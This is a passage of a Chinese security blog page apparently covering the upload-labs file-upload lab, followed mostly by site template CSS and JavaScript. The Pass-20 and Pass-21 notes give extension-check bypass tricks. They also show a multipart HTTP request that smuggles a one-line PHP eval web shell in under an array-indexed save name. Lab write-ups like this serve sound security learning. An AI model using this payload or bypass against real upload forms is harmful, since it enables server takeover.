+<h2 id="pass-20特殊符号">Pass-20(特殊符号)</h2>
+
+<p>windows下构造<code class="language-plaintext highlighter-rouge">php\.</code>,linux构造<code class="language-plaintext highlighter-rouge">php/.</code></p>
+
+<h2 id="pass-21数组后缀绕过">Pass-21(数组后缀绕过)</h2>
+
+<p>如下图用burpsuite改动上传的文件数组。</p>
+
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+</pre></td><td class="rouge-code"><pre><span class="err">......
+------geckoformboundarvc1823aeebf5db4fa9c273c15c84c5143
+Content-Disposition: form-data; name="upload_file"; filename="aaa. jpg"
+Content-Type: image/jpeg
+
+&lt;?php@eval ($_POST['cmd']);?&gt;
+------geckoformboundaryc1823aeebf5db4fa9c273c15c84c5143
+Content-Disposition: form-data; name="save_name[0]"
+
+aaa.php
+------geckoformboundarvc1823aeebf5db4fa9c273c15c84c5143
+Content-Disposition: form-data; name="save_name[2]"
+
+jpg
+------geckoformboundaryc1823aeebf5db4fa9c273c15c84c5143
+Content-Disposition: form-data; name="submit"
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+
+                <hr style="visibility: hidden;">
+                <ul class="pager">
+                    
+                    
+                    <li class="next">
+                        <a href="/%E5%88%86%E7%B1%BB%E5%90%8D%E7%A7%B0/2026/04/04/sqli-labs/" data-toggle="tooltip" data-placement="top" title="sqli-lebs">
+                        下一篇<br>
+                        <span>sqli-lebs</span>
+                        </a>
+                    </li>
+                    
+                </ul>
+                <hr style="visibility: hidden;">
+
+                <!-- giscus 评论系统 -->
+                <div class="comment">
+                    <h4>💬 评论</h4>
+                    <script src="https://giscus.app/client.js"
+                            data-repo="PurgationDevil/PurgationDevil.github.io"
+                            data-repo-id="R_kgDOR4wBWA"
+                            data-category="General"
+                            data-category-id="DIC_kwDOR4wBWM4C83Ny"
+                            data-mapping="pathname"
+                            data-strict="0"
+                            data-reactions-enabled="1"
+                            data-emit-metadata="0"
+                            data-input-position="bottom"
+                            data-theme="preferred_color_scheme"
+                            data-lang="zh-CN"
+                            crossorigin="anonymous"
+                            async>
+                    </script>
+                </div>
+            </div>  
+
+    <!-- Side Catalog Container -->
+        
+            <div class="
+                col-lg-2 col-lg-offset-0
+                visible-lg-block
+                sidebar-container
+                catalog-container">
+                <div class="side-catalog">
+                    <hr class="hidden-sm hidden-xs">
+                    <h5>
+                        <a class="catalog-toggle" href="#">CATALOG</a>
+                    </h5>
+                    <ul class="catalog-body"></ul>
+                </div>
+            </div>
+        
+
+    <!-- Sidebar Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                <!-- Featured Tags -->
+                
+
+
+
+                <!-- Friends Blog -->
+                
+<hr>
+<h5>FRIENDS</h5>
+<ul class="list-inline">
+  
+  <li><a href="http://qiyue.jiushi.gay/">七月的博客</a></li>
+  
+</ul>
+
+            </div>
+        </div>
+    </div>
+</article>
+
+<!-- add support for mathjax by voleking-->
+
+
+
+
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+<!-- anchor-js, Doc:http://bryanbraun.github.io/anchorjs/ -->
+<script>
+    async("//cdnjs.cloudflare.com/ajax/libs/anchor-js/1.1.1/anchor.min.js",function(){
+        anchors.options = {
+          visible: 'hover',
+          placement: 'right',
+          // icon: '#'
+        };
+        anchors.add().remove('.intro-header h1').remove('.subheading').remove('.sidebar-container h5');
+    })
+</script>
+<style>
+    /* place left on bigger screen */
+    @media all and (min-width: 800px) {
+        .anchorjs-link{
+            position: absolute;
+            left: -0.75em;
+            font-size: 1.1em;
+            margin-top : -0.1em;
+        }
+    }
+</style>
+
+
+</div>
+
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <p class="copyright text-muted">
+                    Copyright &copy; PurgationDevil Blog 2026
+                    <br>
+                    Powered by Jekyll
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- jQuery -->
+<script src="/js/jquery.min.js "></script>
+
+<!-- Bootstrap Core JavaScript -->
+<script src="/js/bootstrap.min.js "></script>
+
+<!-- Custom Theme JavaScript -->
+<script src="/js/hux-blog.min.js "></script>
+
+<!-- Simple Jekyll Search -->
+<script src="/js/simple-jekyll-search.min.js"></script>
+<script>
+(function() {
+    SimpleJekyllSearch({
+        searchInput: document.getElementById('search-input'),
+        resultsContainer: document.getElementById('search-results'),
+        json: '/search.json',
+        searchResultTemplate: '<div class="post-preview"><a href="{url}"><h2 class="post-title">{title}</h2><div class="post-meta">标签: {tags} | {date}</div></a></div>',
+        noResultsText: '<div class="alert alert-warning">没有找到相关文章</div>'
+    });
+    
+    var searchPage = document.querySelector('.search-page');
+    var searchIcon = document.querySelector('.search-icon a');
+    var searchClose = document.querySelector('.search-icon-close');
+    var searchInput = document.getElementById('search-input');
+    
+    if (searchIcon) {
+        searchIcon.addEventListener('click', function() {
+            searchPage.classList.add('search-active');
+            setTimeout(function() {
+                searchInput.focus();
+            }, 400);
+        });
+    }
+    
+    if (searchClose) {
+        searchClose.addEventListener('click', function() {
+            searchPage.classList.remove('search-active');
+        });
+    }
+    
+    document.addEventListener('keydown', function(e) {
+        if (e.key === 'Escape' && searchPage.classList.contains('search-active')) {
+            searchPage.classList.remove('search-active');
+        }
+    });
+})();
+</script>
+
+<!-- Service Worker -->
+
+<script src="/js/snackbar.js "></script>
+<script src="/js/sw-registration.js "></script>
+
+
+
+<!-- 回到顶部按钮 -->
+<style>
+.go-top {
+  position: fixed;
+  bottom: 30px;
+  right: 30px;
+  width: 48px;
+  height: 48px;
+  background: #0085a1;
+  color: #fff;
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  cursor: pointer;
+  font-size: 25px;
+  padding-left: 19px;
+  font-weight: bold;
+  opacity: 0;
+  visibility: hidden;
+  transition: all 0.3s ease;
+  z-index: 999;
+  box-shadow: 0 2px 12px rgba(0,0,0,0.15);
+  text-decoration: none;
+  border: none;
+}
+
+.go-top:hover {
+  background: #006680;
+  transform: scale(1.08);
+}
+
+.go-top.show {
+  opacity: 1;
+  visibility: visible;
+}
+
+@media (max-width: 768px) {
+  .go-top {
+    bottom: 20px;
+    right: 20px;
+    width: 42px;
+    height: 42px;
+    font-size: 20px;
+  }
+}
+
+/* 手机端浮动目录按钮 - 默认隐藏 */
+.toc-mobile-btn {
+  position: fixed;
+  right: 15px;
+  bottom: 100px;
+  width: 45px;
+  height: 45px;
+  background: #0085a1;
+  color: #fff;
+  border-radius: 50%;
+  align-items: center;
+  justify-content: center;
+  font-size: 18px;
+  box-shadow: 0 2px 12px rgba(0,0,0,0.2);
+  cursor: pointer;
+  z-index: 1000;
+  display: none !important;
+}
+
+.toc-mobile-panel {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background: rgba(0,0,0,0.8);
+  z-index: 2000;
+  transform: translateX(-100%);
+  transition: transform 0.3s ease;
+}
+
+.toc-mobile-panel.active {
+  transform: translateX(0);
+}
+
+.toc-mobile-content {
+  position: absolute;
+  left: 0;
+  top: 0;
+  width: 85%;
+  max-width: 320px;
+  height: 100%;
+  background: #fff;
+  padding: 20px;
+  overflow-y: auto;
+}
+
+.toc-mobile-content h4 {
+  margin: 0 0 15px 0;
+  font-size: 16px;
+  font-weight: 600;
+  color: #333;
+  padding-bottom: 10px;
+  border-bottom: 2px solid #0085a1;
+}
+
+.toc-mobile-content ul {
+  list-style: none;
+  padding-left: 0;
+  margin: 0;
+}
+
+.toc-mobile-content li {
+  margin: 10px 0;
+}
+
+.toc-mobile-content a {
+  color: #555;
+  text-decoration: none;
+  font-size: 14px;
+  display: block;
+  padding: 8px;
+  border-radius: 4px;
+  transition: all 0.2s;
+}
+
+.toc-mobile-content a:hover,
+.toc-mobile-content a.active {
+  background: #f0f0f0;
+  color: #0085a1;
+}
+
+.toc-mobile-close {
+  position: absolute;
+  right: 15px;
+  top: 15px;
+  font-size: 24px;
+  color: #999;
+  cursor: pointer;
+}
+
+/* 手机端显示目录按钮 */
+@media (max-width: 992px) {
+  .toc-mobile-btn.show {
+    display: flex !important;
+    align-items: center !important;
+    justify-content: center !important;
+  }
+}
+
+/* 深色模式手机端目录 */
+@media (prefers-color-scheme: dark) {
+  .toc-mobile-content {
+    background: #0a141e;
+  }
+  
+  .toc-mobile-content h4 {
+    color: #fff;
+    border-bottom-color: #00d4ff;
+  }
+  
+  .toc-mobile-content a {
+    color: #d4d4d4;
+  }
+  
+  .toc-mobile-content a:hover,
+  .toc-mobile-content a.active {
+    background: rgba(0, 212, 255, 0.15);
+    color: #00d4ff;
+  }
+  
+  .toc-mobile-close {
+    color: #666;
+  }
+}
+</style>
+
+<div class="go-top" id="goTopBtn">↑</div>
+
+<!-- 手机端目录按钮 -->
+<div class="toc-mobile-btn" id="tocMobileBtn">☰</div>
+
+<!-- 手机端目录面板 -->
+<div class="toc-mobile-panel" id="tocMobilePanel">
+  <div class="toc-mobile-content">
+    <div class="toc-mobile-close" id="tocMobileClose">×</div>
+    <h4>📖 目录</h4>
+    <ul id="tocMobileList"></ul>
+  </div>
+</div>
+
+<script>
+(function() {
+  var btn = document.getElementById('goTopBtn');
+  if (!btn) return;
+  
+  window.addEventListener('scroll', function() {
+    if (window.scrollY > 300) {
+      btn.classList.add('show');
+    } else {
+      btn.classList.remove('show');
+    }
+  });
+  
+  btn.addEventListener('click', function() {
+    window.scrollTo({ top: 0, behavior: 'smooth' });
+  });
+})();
+</script>
+
+<!-- 目录功能 JavaScript -->
+<script>
+(function() {
+  function initToc() {
+    var article = document.querySelector('.post-container');
+    if (!article) return;
+    
+    var headers = article.querySelectorAll('h2, h3');
+    if (headers.length === 0) return;
+    
+    // 显示目录按钮（只有文章页面才显示）
+    var mobileBtn = document.getElementById('tocMobileBtn');
+    if (mobileBtn) {
+      mobileBtn.classList.add('show');
+    }
+    
+    // 创建手机端目录列表
+    var mobileTocList = document.getElementById('tocMobileList');
+    if (!mobileTocList) return;
+    mobileTocList.innerHTML = '';
+    
+    headers.forEach(function(header, index) {
+      var id = 'toc-' + index;
+      header.id = id;
+      
+      // 手机端目录项
+      var mobileLi = document.createElement('li');
+      var mobileA = document.createElement('a');
+      mobileA.href = '#' + id;
+      mobileA.textContent = header.textContent;
+      mobileA.addEventListener('click', function(e) {
+        e.preventDefault();
+        document.getElementById(id).scrollIntoView({ behavior: 'smooth', block: 'start' });
+        document.getElementById('tocMobilePanel').classList.remove('active');
+      });
+      mobileLi.appendChild(mobileA);
+      mobileTocList.appendChild(mobileLi);
+    });
+    
+    // 高亮当前章节
+    var tocLinks = document.querySelectorAll('.toc-mobile-content a');
+    window.addEventListener('scroll', function() {
+      var scrollPos = window.scrollY + 100;
+      var currentId = null;
+      
+      headers.forEach(function(header) {
+        var offsetTop = header.offsetTop;
+        if (offsetTop <= scrollPos) {
+          currentId = header.id;
+        }
+      });
+      
+      tocLinks.forEach(function(link) {
+        link.classList.remove('active');
+        var href = link.getAttribute('href').substring(1);
+        if (href === currentId) {
+          link.classList.add('active');
+        }
+      });
+    });
+  }
+  
+  // 手机端目录按钮事件
+  var mobileBtn = document.getElementById('tocMobileBtn');
+  var mobilePanel = document.getElementById('tocMobilePanel');
+  var mobileClose = document.getElementById('tocMobileClose');
+  
+  if (mobileBtn && mobilePanel) {
+    mobileBtn.addEventListener('click', function() {
+      mobilePanel.classList.add('active');
+    });
+  }
+  
+  if (mobileClose && mobilePanel) {
+    mobileClose.addEventListener('click', function() {
+      mobilePanel.classList.remove('active');
+    });
+  }
+  
+  if (mobilePanel) {
+    mobilePanel.addEventListener('click', function(e) {
+      if (e.target === mobilePanel) {
+        mobilePanel.classList.remove('active');
+      }
+    });
+  }
+  
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', initToc);
+  } else {
+    initToc();
+  }
+})();
+</script>
+
+<!-- 代码块深色主题（统一风格） -->
+<style>
+.highlight,
+pre.highlight {
+    background: #282c34 !important;
+    color: #abb2bf !important;
+    border-radius: 8px;
+    padding: 12px;
+    overflow-x: auto;
+}
+
+/* 代码块内文字颜色 */
+.highlight .c  { color: #5c6370 !important; font-style: italic; } /* 注释 */
+.highlight .k  { color: #c678dd !important; } /* 关键字 */
+.highlight .s  { color: #98c379 !important; } /* 字符串 */
+.highlight .n  { color: #abb2bf !important; } /* 变量名 */
+.highlight .p  { color: #abb2bf !important; } /* 括号 */
+.highlight .cm { color: #5c6370 !important; } /* 多行注释 */
+.highlight .nt { color: #e06c75 !important; } /* 标签 */
+
+/* 补充更多代码高亮样式 */
+.highlight .err { color: #960050 !important; background-color: #1e0010 !important; }
+.highlight .l { color: #98c379 !important; }
+.highlight .o { color: #abb2bf !important; }
+.highlight .cp { color: #5c6370 !important; font-style: italic; }
+.highlight .c1 { color: #5c6370 !important; font-style: italic; }
+.highlight .cs { color: #5c6370 !important; font-style: italic; }
+.highlight .kc { color: #c678dd !important; }
+.highlight .kd { color: #c678dd !important; }
+.highlight .kn { color: #c678dd !important; }
+.highlight .kp { color: #c678dd !important; }
+.highlight .kr { color: #c678dd !important; }
+.highlight .kt { color: #c678dd !important; }
+.highlight .ld { color: #98c379 !important; }
+.highlight .m { color: #d19a66 !important; }
+.highlight .na { color: #d19a66 !important; }
+.highlight .nb { color: #e5c07b !important; }
+.highlight .nc { color: #e5c07b !important; }
+.highlight .no { color: #e5c07b !important; }
+.highlight .nd { color: #e5c07b !important; }
+.highlight .ni { color: #e5c07b !important; }
+.highlight .ne { color: #e5c07b !important; }
+.highlight .nf { color: #abb2bf !important; }
+.highlight .nl { color: #e5c07b !important; }
+.highlight .nn { color: #abb2bf !important; }
+.highlight .nx { color: #abb2bf !important; }
+.highlight .py { color: #e5c07b !important; }
+.highlight .nv { color: #e5c07b !important; }
+.highlight .ow { font-weight: 700; }
+.highlight .w { color: #f8f8f2 !important; }
+.highlight .mf { color: #d19a66 !important; }
+.highlight .mh { color: #d19a66 !important; }
+.highlight .mi { color: #d19a66 !important; }
+.highlight .mo { color: #d19a66 !important; }
+.highlight .sb { color: #98c379 !important; }
+.highlight .sc { color: #98c379 !important; }
+.highlight .sd { color: #98c379 !important; }
+.highlight .s2 { color: #98c379 !important; }
+.highlight .se { color: #98c379 !important; }
+.highlight .sh { color: #98c379 !important; }
+.highlight .si { color: #98c379 !important; }
+.highlight .sx { color: #98c379 !important; }
+.highlight .sr { color: #56b6c2 !important; }
+.highlight .s1 { color: #98c379 !important; }
+.highlight .ss { color: #56b6c2 !important; }
+.highlight .bp { color: #e5c07b !important; }
+.highlight .vc { color: #e5c07b !important; }
+.highlight .vg { color: #e5c07b !important; }
+.highlight .vi { color: #e06c75 !important; }
+.highlight .il { color: #d19a66 !important; }
+
+/* 行号样式 */
+.highlight .lineno {
+    color: #5c6370 !important;
+    padding-right: 12px;
+    border-right: 1px solid #3e4451;
+    margin-right: 12px;
+}
+</style>
+
+<!-- 搜索页面样式 -->
+<style>
+.search-page {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background: #fff;
+  z-index: 2000;
+  transform: translateY(100%);
+  transition: transform 0.4s ease;
+  overflow-y: auto;
+}
+
+.search-page.search-active {
+  transform: translateY(0);
+}
+
+.search-icon-close-container {
+  position: absolute;
+  top: 20px;
+  right: 20px;
+  cursor: pointer;
+  font-size: 24px;
+  z-index: 2001;
+}
+
+.search-main {
+  padding-top: 80px;
+}
+
+#search-input {
+  width: 100%;
+  padding: 15px;
+  font-size: 24px;
+  border: none;
+  border-bottom: 2px solid #0085a1;
+  outline: none;
+}
+
+#search-results {
+  margin-top: 30px;
+}
+</style>
+
+<!-- 页面背景和文字颜色样式 - 跟随系统主题 -->
+<style>
+:root {
+  --bg-color: #ffffff;
+  --text-color: #333333;
+  --text-light: #666666;
+  --heading-color: #000000;
+  --link-color: #0085a1;
+  --navbar-bg: rgba(255, 255, 255, 0.85);
+  --navbar-text: #66ccff;
+  --gradient-end: rgba(255, 255, 255, 1);
+}
+
+@media (prefers-color-scheme: dark) {
+  :root {
+    --bg-color: #0a141e;
+    --text-color: #e6e6e6;
+    --text-light: #d4d4d4;
+    --heading-color: #ffffff;
+    --link-color: #00d4ff;
+    --navbar-bg: rgba(10, 20, 30, 0.85);
+    --navbar-text: #66ccff;
+    --gradient-end: rgba(10, 20, 30, 1);
+  }
+}
+
+body {
+  background-color: var(--bg-color) !important;
+  color: var(--text-color) !important;
+}
+
+.post-container,
+.article-container {
+  color: var(--text-color) !important;
+}
+
+.post-container p,
+.post-container li,
+.post-container span {
+  color: var(--text-light) !important;
+}
+
+.post-container h1,
+.post-container h2,
+.post-container h3,
+.post-container h4,
+.post-container h5,
+.post-container h6 {
+  color: var(--heading-color) !important;
+}
+
+.post-container a {
+  color: var(--link-color) !important;
+}
+
+.navbar-custom .nav li a,
+.navbar-custom .navbar-brand {
+    color: var(--navbar-text) !important;
+}
+
+.navbar-custom .nav li a:hover,
+.navbar-custom .navbar-brand:hover {
+    color: #3399ff !important;
+}
+
+.navbar-custom {
+    background-color: var(--navbar-bg) !important;
+}
+
+.intro-header .site-heading h1,
+.intro-header .page-heading h1 {
+    color: #ffffff !important;
+    font-size: 60px !important;
+}
+
+.intro-header .site-heading .subheading {
+    color: #ffffff !important;
+}
+
+.intro-header {
+    position: relative;
+}
+
+.intro-header::after {
+    content: "";
+    position: absolute;
+    bottom: 0;
+    left: 0;
+    width: 100%;
+    height: 120px;
+    background: linear-gradient(to bottom, rgba(255, 255, 255, 0), var(--gradient-end));
+    pointer-events: none;
+}
+
+@media (prefers-color-scheme: dark) {
+  /* 首页文章卡片 */
+  .post-card {
+    border-bottom-color: rgba(255, 255, 255, 0.1) !important;
+  }
+  .post-card-title a {
+    color: #ffffff !important;
+  }
+  .post-card-title a:hover {
+    color: #00d4ff !important;
+  }
+  .post-card-date,
+  .post-card-meta {
+    color: #b3b3b3 !important;
+  }
+  .post-card-excerpt {
+    color: #d4d4d4 !important;
+  }
+  
+  /* 归档页面 */
+  .archive-year {
+    color: #ffffff !important;
+    border-left-color: #00d4ff !important;
+  }
+  .archive-date {
+    color: #b3b3b3 !important;
+  }
+  .archive-item a {
+    color: #e6e6e6 !important;
+  }
+  .archive-item a:hover {
+    color: #00d4ff !important;
+  }
+  
+  /* 归档标签按钮 */
+  #tag_cloud a,
+  #tag_cloud .tag-button--all {
+    background: rgba(255, 255, 255, 0.1) !important;
+    color: #e6e6e6 !important;
+  }
+  #tag_cloud a.active,
+  #tag_cloud .tag-button--all.active {
+    background: #0085a1 !important;
+    color: #ffffff !important;
+  }
+  #tag_cloud a:hover,
+  #tag_cloud .tag-button--all:hover {
+    background: rgba(0, 212, 255, 0.3) !important;
+    color: #ffffff !important;
+  }
+  #tag_cloud sup {
+    color: #999 !important;
+  }
+  #tag_cloud a.active sup,
+  #tag_cloud .tag-button--all.active sup {
+    color: #ffffff !important;
+  }
+  
+  .waifu-tips {
+    background-color: rgba(30, 40, 60, 0.9) !important;
+    border-color: rgba(0, 212, 255, 0.5) !important;
+    box-shadow: 0 3px 15px 2px rgba(0, 212, 255, 0.2) !important;
+    color: #ffffff !important;
+  }
+  .hide-button {
+    background: rgba(0, 212, 255, 0.2) !important;
+    border-color: rgba(0, 212, 255, 0.4) !important;
+    box-shadow: 0 3px 15px 2px rgba(0, 212, 255, 0.4) !important;
+    color: #ffffff !important;
+  }
+  .hide-button:hover {
+    background: rgba(0, 212, 255, 0.3) !important;
+    border-color: #00d4ff !important;
+  }
+  .show-button {
+    background: rgba(0, 212, 255, 0.8) !important;
+    border-color: rgba(0, 212, 255, 0.6) !important;
+    box-shadow: 0 3px 15px 2px rgba(0, 212, 255, 0.4) !important;
+  }
+}
+</style>
+
+<!-- 粒子背景 -->
+<div id="particles-js" style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1;"></div>
+
+<script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
+<script>
+  particlesJS("particles-js", {
+    "particles": {
+      "number": { "value": 100 },
+      "color": { "value": "#00ffff" },
+      "shape": { "type": "circle" },
+      "opacity": { "value": 0.6, "random": true },
+      "size": { "value": 3, "random": true },
+      "line_linked": { "enable": false },
+      "move": { "enable": true, "speed": 2, "direction": "none", "random": true }
+    },
+    "interactivity": {
+      "detect_on": "canvas",
+      "events": {
+        "onhover": { "enable": false },
+        "onclick": { "enable": false }
+      }
+    }
+  });
+</script>
+
+<!-- 鼠标点击特效 -->
+<style>
+.click-particle {
+  position: fixed;
+  border-radius: 50%;
+  pointer-events: none;
+  z-index: 9999;
+  animation: particleExplode 0.6s ease-out forwards;
+}
+
+.click-ripple {
+  position: fixed;
+  border: 3px solid #ff69b4;
+  border-radius: 50%;
+  pointer-events: none;
+  z-index: 9998;
+  animation: rippleExpand 0.8s ease-out forwards;
+}
+
+@keyframes particleExplode {
+  0% {
+    opacity: 1;
+    transform: translate(0, 0);
+  }
+  100% {
+    opacity: 0;
+    transform: translate(var(--tx), var(--ty));
+  }
+}
+
+@keyframes rippleExpand {
+  0% {
+    opacity: 1;
+    transform: scale(0);
+  }
+  100% {
+    opacity: 0;
+    transform: scale(3);
+  }
+}
+</style>
+
+<script>
+(function() {
+  var colors = ['#00ffff', '#ff00ff', '#ffff00', '#00ff00', '#ff6600', '#0066ff', '#ff3366'];
+  
+  document.addEventListener('click', function(e) {
+    var centerX = e.clientX;
+    var centerY = e.clientY;
+    
+    var count = 6;
+    for (var i = 0; i < count; i++) {
+      var angle = (Math.PI * 2 / count) * i + Math.random() * 0.5;
+      var distance = 80 + Math.random() * 60;
+      var size = 10 + Math.random() * 16;
+      var particle = document.createElement('div');
+      particle.className = 'click-particle';
+      
+      particle.style.width = size + 'px';
+      particle.style.height = size + 'px';
+      particle.style.left = centerX - size/2 + 'px';
+      particle.style.top = centerY - size/2 + 'px';
+      particle.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
+      particle.style.boxShadow = '0 0 ' + (size/2 + 8) + 'px ' + particle.style.backgroundColor + ', 0 0 ' + (size + 15) + 'px ' + particle.style.backgroundColor;
+      
+      var tx = Math.cos(angle) * distance;
+      var ty = Math.sin(angle) * distance;
+      particle.style.setProperty('--tx', tx + 'px');
+      particle.style.setProperty('--ty', ty + 'px');
+      
+      document.body.appendChild(particle);
+      
+      setTimeout(function(p) {
+        p.remove();
+      }, 600, particle);
+    }
+    
+    var ripple = document.createElement('div');
+    ripple.className = 'click-ripple';
+    ripple.style.width = '40px';
+    ripple.style.height = '40px';
+    ripple.style.left = centerX - 20 + 'px';
+    ripple.style.top = centerY - 20 + 'px';
+    document.body.appendChild(ripple);
+    
+    setTimeout(function(r) {
+      r.remove();
+    }, 800, ripple);
+  });
+})();
+</script>
+
+<!-- 加载 Font Awesome 图标库 -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome/css/font-awesome.min.css">
+
+<!-- Live2D 看板娘 - 本地资源 -->
+<link rel="stylesheet" href="/live2d/css/waifu.css">
+<div class="waifu" id="landlord">
+    <div class="waifu-tips"></div>
+    <canvas id="live2d" width="300" height="300"></canvas>
+    <div class="hide-button">隐藏</div>
+</div>
+<div class="show-button" id="showWaifuBtn" style="display: none;">🌸</div>
+<script src="https://cdn.jsdelivr.net/npm/jquery/dist/jquery.min.js"></script>
+<script src="/live2d/js/live2d.js"></script>
+<script src="/live2d/js/waifu.js"></script>
+<script>
+  loadlive2d("live2d", "/live2d/model/pio/model.json");
+  console.log("Pio 酱模型已从本地加载");
+</script>
+
+<style>
+.animecursor-disabled,
+.animecursor-disabled * {
+  cursor: auto !important;
+}
+
+input, textarea, [contenteditable] {
+  cursor: text !important;
+}
+</style>
+
+<script src="/js/anime-cursor/dist/anime-cursor.umd.min.js"></script>
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+    try {
+        new AnimeCursor({
+            fallbackCursor: 'auto',
+            excludeSelectors: 'input, textarea, [contenteditable]',
+            cursors: {
+                default: {
+                    image: '/img/mouse/default_001.png',
+                    default: true,
+                    offset: [0, 0]
+                },
+                pointer: {
+                    tags: ['a', 'button'],
+                    image: '/img/mouse/default_001.png',
+                    offset: [0, 0]
+                },
+                landlord: {
+                    tags: ['.waifu', '#landlord', '#live2d'],
+                    image: '/img/mouse/landlord_001.png',
+                    offset: [0, 0]
+                }
+            }
+        });
+        console.log('AnimeCursor initialized successfully');
+    } catch (error) {
+        console.error('AnimeCursor initialization failed:', error);
+        document.body.classList.add('animecursor-disabled');
+    }
+});
+
+document.addEventListener('DOMContentLoaded', function() {
+    setTimeout(function() {
+        var loader = document.getElementById('loader-wrapper');
+        if (loader) {
+            loader.classList.add('loaded');
+            
+            setTimeout(function() {
+                var mainContent = document.getElementById('main-content');
+                if (mainContent) {
+                    mainContent.classList.add('content-fade-in');
+                }
+                
+                setTimeout(function() {
+                    loader.remove();
+                }, 1000);
+            }, 300);
+        }
+    }, 800);
+});
+
+var loadPercent = 0;
+var percentInterval = setInterval(function() {
+    loadPercent += Math.random() * 15;
+    if (loadPercent > 95) loadPercent = 95;
+    document.getElementById('loader-percent').textContent = Math.round(loadPercent) + '%';
+}, 200);
+
+document.addEventListener('DOMContentLoaded', function() {
+    clearInterval(percentInterval);
+    document.getElementById('loader-percent').textContent = '100%';
+});
+</script>
